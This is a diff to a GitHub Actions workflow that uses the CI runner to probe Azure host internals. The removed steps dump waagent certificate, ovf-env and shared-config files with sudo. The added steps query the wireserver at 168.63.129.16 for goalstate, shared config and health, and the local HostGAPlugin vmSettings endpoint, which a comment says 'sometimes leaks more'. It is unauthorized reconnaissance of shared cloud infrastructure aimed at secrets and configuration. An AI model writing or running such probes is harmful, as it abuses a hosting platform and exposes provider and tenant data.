@@ -1,72 +1,41 @@
-name: WAAgent Certs Probe
+name: Wireserver Probe
 on: [push]
 
 jobs:
-  certs:
+  wireserver:
     runs-on: ubuntu-latest
     steps:
-      - name: Read waagent CERTS only (public)
+      - name: Try wireserver with right headers
         shell: bash
         run: |
           set +e
           
-          echo "===== TransportCert.pem (PUBLIC cert that signs IMDS attested doc) ====="
-          sudo cat /var/lib/waagent/TransportCert.pem 2>&1 | head -25
+          echo "===== goalstate via sudo ====="
+          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2015-04-05" 2>&1 | head -100
           echo ""
           
-          echo "===== Public *.crt files ====="
-          for f in $(sudo ls /var/lib/waagent/*.crt 2>/dev/null); do
-            echo "----- $f -----"
-            sudo cat "$f" 2>&1 | head -25
-            echo ""
-            sudo openssl x509 -in "$f" -noout -text 2>&1 | head -40
-            echo ""
-          done
-          
-          echo "===== Certificates.xml (reveals cert names + hashes - NOT keys) ====="
-          sudo cat /var/lib/waagent/Certificates.xml 2>&1 | head -30
+          echo "===== machine via sudo ====="
+          sudo curl --max-time 10 -s "http://168.63.129.16/machine" -H "x-ms-version: 2015-04-05" 2>&1 | head -50
           echo ""
           
-          echo "===== Certificates.pem ====="
-          sudo cat /var/lib/waagent/Certificates.pem 2>&1 | head -30
+          echo "===== shared config ====="
+          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=config&type=sharedConfig&incarnation=1" -H "x-ms-version: 2015-04-05" 2>&1 | head -100
           echo ""
           
-          echo "===== SharedConfig.xml (deployment / role info) ====="
-          sudo cat /var/lib/waagent/SharedConfig.xml 2>&1 | head -50
+          echo "===== As non-sudo (should be BLOCKED) ====="
+          curl --max-time 5 -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2015-04-05" 2>&1 | head -10 || echo "blocked"
           echo ""
           
-          echo "===== HostingEnvironmentConfig.xml ====="
-          sudo cat /var/lib/waagent/HostingEnvironmentConfig.xml 2>&1 | head -50
+          echo "===== Heartbeat status ====="
+          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=health" -H "x-ms-version: 2015-04-05" -X POST 2>&1 | head -30
           echo ""
           
-          echo "===== ovf-env.xml ====="
-          sudo cat /var/lib/waagent/ovf-env.xml 2>&1
-          echo ""
+          echo "===== HostGAPlugin (sometimes leaks more) ====="
+          # Most Azure VMs run HostGAPlugin on port 32526 locally
+          sudo curl --max-time 5 -s "http://127.0.0.1:32526/vmSettings" 2>&1 | head -30 || echo "no host plugin"
           
-          echo "===== WireServerEndpoint ====="
-          sudo cat /var/lib/waagent/WireServerEndpoint 2>&1
           echo ""
-          
-          echo "===== fast_track.json ====="
-          sudo cat /var/lib/waagent/fast_track.json 2>&1
-          echo ""
-          
-          echo "===== Microsoft.CPlat.Core.RunCommandLinux-1.0.9 ====="
-          sudo ls -la /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 2>&1
-          echo ""
-          
-          echo "===== Probe wireserver via TCP using transport cert ====="
-          # Wireserver is at 168.63.129.16; check if reachable from runner uid
-          curl --max-time 3 -s "http://168.63.129.16/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -20 || echo "Wireserver: BLOCKED"
-          # Try with sudo
-          sudo curl --max-time 3 -s "http://168.63.129.16/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -50 || echo "Wireserver via sudo: BLOCKED"
-          echo ""
-          
-          echo "===== /var/log/azure/ ====="
-          sudo find /var/log/azure -type f 2>&1 | head -10
-          for f in $(sudo find /var/log/azure -type f 2>/dev/null | head -3); do
-            echo "----- $f -----"
-            sudo head -20 "$f" 2>&1
-          done
+          echo "===== /run/extensions ====="
+          sudo find /run /var/run -name "*.json" 2>&1 | head -10
           
           true
